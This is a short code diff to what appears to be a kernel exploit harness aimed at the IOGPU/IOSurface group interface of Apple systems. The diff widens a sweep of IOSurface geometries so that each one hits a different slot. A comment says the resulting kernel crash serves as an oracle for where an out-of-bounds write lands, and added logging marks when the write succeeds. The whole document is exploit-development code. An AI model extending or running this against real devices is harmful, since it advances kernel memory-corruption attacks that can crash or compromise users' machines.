@@ -657,16 +657,15 @@ void nk_iogpu_group_oob_run(int trigger)
         static uint8_t o6[0x200];
         size_t on6 = 0;
 
-        struct { uint32_t w, h, bpe, fmt; } geos[] = {
-            { 16, 16, 4, 0 }, { 32, 32, 4, 0 }, { 64, 64, 4, 0 },
-            { 128, 128, 4, 0 }, { 256, 256, 4, 0 }, { 512, 512, 4, 0 },
-            { 1024, 1024, 4, 0 }, { 17, 13, 4, 0 }, { 33, 31, 4, 0 },
-            { 65, 63, 4, 0 }, { 129, 127, 4, 0 }, { 255, 255, 4, 0 },
-            { 1023, 1023, 4, 0 }, { 4095, 4095, 4, 0 }, { 7, 5, 4, 0 },
-            { 8, 8, 1, 0 }, { 8, 8, 2, 0 }, { 8, 8, 8, 0 },
-            { 12, 12, 16, 0 }, { 2048, 2048, 4, 0 }
-        };
-        uint32_t ngeo = sizeof(geos) / sizeof(geos[0]);
+        /* The write offset is a function of the IOSurface hash, so we walk a
+         * wide set of geometries: each one lands on a different slot index
+         * in the group. The crash is the oracle - the last durable line
+         * before the reboot names the geometry that hit something. */
+        static struct { uint32_t w, h, bpe, fmt; } geos[256];
+        uint32_t ngeo = 0;
+        for (uint32_t w = 1; w <= 16 && ngeo < 256; w++)
+            for (uint32_t h = 1; h <= 16 && ngeo < 256; h++)
+                geos[ngeo++] = (typeof(geos[0])){ w, h, 4, 0 };
 
         for (uint32_t gi = 0; gi < ngeo; gi++) {
             const void *keys[] = { kIOSurfaceWidth, kIOSurfaceHeight,
@@ -706,6 +705,8 @@ void nk_iogpu_group_oob_run(int trigger)
                 memcpy(&gh3, o6 + 0x10, 8);
                 grp_dump_handle(gh3, "after-add2");
             }
+            ol("[grp] geo[%u] %ux%u bpe=%u id=%u add1=0x%x - DUP ADD NEXT", gi,
+               geos[gi].w, geos[gi].h, geos[gi].bpe, id, a1);
             ol("[grp] geo[%u] id=%u add1=0x%x add2=0x%x%s", gi, id, a1, a2,
                (a2 == (int)0x10000003) ? "  *** CLIENT DIED - OOB WRITE LANDED ***" : "");
             if (a2 == (int)0x10000003) { ol("[grp] dead at geo[%u]", gi); break; }
